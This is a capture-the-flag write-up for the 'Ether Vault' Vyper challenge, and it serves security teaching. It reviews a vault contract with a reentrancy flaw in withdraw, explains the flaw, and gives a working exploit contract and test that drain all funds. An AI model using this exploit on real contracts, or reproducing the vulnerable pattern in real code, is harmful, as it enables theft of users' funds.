## 1) Challenge

> <cite>The Ether Vault allows deposits and withdrawals. It currently holds 10 Ether. Your objective is to drain all of the Ether from the vault.</cite>

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

`EtherVault.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/ether-vault/EtherVault.vy)):

```python

# @version ^0.3.2

"""
@title Ether Liquidity Pool
@author jtriley.eth
"""


event Deposit:
    account: indexed(address)
    amount: uint256

event Withdrawal:
    account: indexed(address)
    amount: uint256


deposits: public(HashMap[address, uint256])


@external
@payable
def deposit():
    """
    @notice Deposits Ether.
    """
    self.deposits[msg.sender] = unsafe_add(self.deposits[msg.sender], msg.value)

    log Deposit(msg.sender, msg.value)


@external
def withdraw():
    """
    @notice Withdraws Ether.
    """
    amount: uint256 = self.deposits[msg.sender]

    raw_call(msg.sender, b"", value=amount)

    self.deposits[msg.sender] = 0

    log Withdrawal(msg.sender, amount)


@external
@payable
def __default__():
    """
    @notice Receives Ether as Deposit.
    """
    self.deposits[msg.sender] = unsafe_add(self.deposits[msg.sender], msg.value)

    log Deposit(msg.sender, msg.value)


```

Contract main functions:

- `deposit` and the fallback function `__default__` update the public variable `deposits` (a HashMap that holds the balances of different accounts), incrementing the balance of the account that calls the function (line 27 and line 52)

- `withdraw` takes the value from the `deposits` variable (line 37), sends this value  to `msg.sender` and later set the `deposits` balance for `msg.sender` equals to `0`

#### How can we drain all the ETH balance from the contract?

The `withdraw` function is vulnerable to a reentrancy attack because it first sends ETH to the caller and only later updates their balance. It means we can call again the withdraw function (in our fallback function) and drain all the funds from the contract. It is possible because the variable used to determine the withdrawal amount, i.e. `deposits`, is only updated after the ETH are sent, so if we re-enter the function by calling again as soon as we receive some ETH, it will hold the same value again (so we'll receive the same amount). If we repeat these steps until the  `EtherVault` has funds, we can drain all its ether.


## 3) Solution

The solution consists of four different steps:
- send `1` ETH to our attack contract
- from our contract, deposit `1` ETH so that the `deposits` variable for our contract will hold `1` ETH
- call the `withdraw` function
- inside the `__default__` fallback function, call the `withdraw` function again until the `EtherVault` balance is greater than `0`

`ether-vault.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (await ethers.getContractFactory('EtherVaultExploit', deployer)).deploy(this.vault.address)

        await exploit.connect(attacker).run({
            value: ethers.utils.parseEther('1')
        });

    })

```


`EtherVaultExploit.vy`:
```python

# YOUR EXPLOIT HERE
@external
@payable
def run():
    raw_call(
        self.target,
        _abi_encode("", method_id=method_id("deposit()")),
        value=msg.value
    )

    Ethervault(self.target).withdraw()


@external
@payable
def __default__():
    if self.target.balance > 0:
        Ethervault(self.target).withdraw()

```


You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/ether-vault.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/EtherVaultExploit.vy).


## 4) References

- [SWC-107 - Reentrancy](https://swcregistry.io/docs/SWC-107)